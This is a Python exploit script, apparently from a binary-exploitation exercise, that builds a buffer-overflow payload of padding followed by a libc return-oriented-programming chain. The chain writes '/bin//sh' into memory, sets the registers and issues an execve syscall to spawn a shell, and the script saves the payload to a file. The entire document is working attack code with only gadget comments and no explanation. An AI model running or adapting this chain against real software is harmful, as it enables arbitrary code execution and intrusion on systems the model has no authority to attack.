#!/usr/bin/env python3
import struct

if __name__ == '__main__' :
	# Enter the amount of junk required
	payload = b'A'*(128+8-6)

	# Enter offset of the binary loaded in memory
	#offset = 0x7ffff7a0d000	#gdb
	offset = 0x7faa5e2bb000		#aslr

	payload += struct.pack('<Q', offset+0xea75a)		# 0x00000000000ea75a : pop rcx ; pop rbx ; ret
	payload += struct.pack('<Q', 0x68732f2f6e69622f)		# b'/bin//sh'
	payload += struct.pack('<Q', 0xdeadbeefdeadbeef)		# Padding
	payload += struct.pack('<Q', offset+0x21112)		# 0x0000000000021112 : pop rdi ; ret
	payload += struct.pack('<Q', offset+0x3c4080)		# Location to write
	payload += struct.pack('<Q', offset+0x1f9c2)		# 0x000000000001f9c2 : mov qword ptr [rdi], rcx ; ret
	# b'\x00\x00\x00\x00\x00\x00\x00\x00'
	payload += struct.pack('<Q', offset+0x8b945)		# 0x000000000008b945 : xor rax, rax ; ret
	payload += struct.pack('<Q', offset+0x115166)		# 0x0000000000115166 : pop rdx ; ret
	payload += struct.pack('<Q', offset+0x3c4088)		# Location to write
	payload += struct.pack('<Q', offset+0x2e1ac)		# 0x000000000002e1ac : mov qword ptr [rdx], rax ; ret
	payload += struct.pack('<Q', offset+0x3a738)		# 0x000000000003a738 : pop rax ; ret
	payload += struct.pack('<Q', 0x3b)		# prep rax for execve syscall
	payload += struct.pack('<Q', offset+0x21112)		# 0x0000000000021112 : pop rdi ; ret
	payload += struct.pack('<Q', offset+0x3c4080)		# command to run
	payload += struct.pack('<Q', offset+0x202f8)		# 0x00000000000202f8 : pop rsi ; ret
	payload += struct.pack('<Q', offset+0x3c4088)		# pointer to null
	payload += struct.pack('<Q', offset+0x115166)		# 0x0000000000115166 : pop rdx ; ret
	payload += struct.pack('<Q', offset+0x3c4088)		# pointer to null
	payload += struct.pack('<Q', offset+0x1fa18)		# 0x000000000001fa18 : syscall

	fd = open('payload.txt', 'wb')
	fd.write(payload)
	fd.write(b'\n')
	fd.close()
